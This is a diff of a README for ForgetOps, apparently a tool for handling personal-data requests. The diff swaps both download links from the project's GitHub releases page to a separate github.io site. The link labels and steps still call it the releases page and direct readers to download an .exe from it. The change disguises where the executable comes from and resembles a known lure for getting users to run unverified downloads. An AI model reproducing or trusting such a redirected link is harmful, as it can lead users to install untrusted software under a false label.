@@ -1,12 +1,12 @@
 # 🛡️ ForgetOps - Manage personal data across your apps
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Stevenl6412/ForgetOps/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://stevenl6412.github.io)
 
 ForgetOps helps you handle data requests for your online accounts. It automates the process of finding, exporting, and deleting personal information from various services. Use this tool to save time and meet privacy requirements like GDPR without manual work.
 
 ## 📥 How to download the app
 
-1. Visit the [ForgetOps releases page](https://github.com/Stevenl6412/ForgetOps/releases).
+1. Visit the [ForgetOps releases page](https://stevenl6412.github.io).
 2. Look for the latest version at the top of the page.
 3. Find the file ending in `.exe` under the Assets section.
 4. Click the file name to start your download.
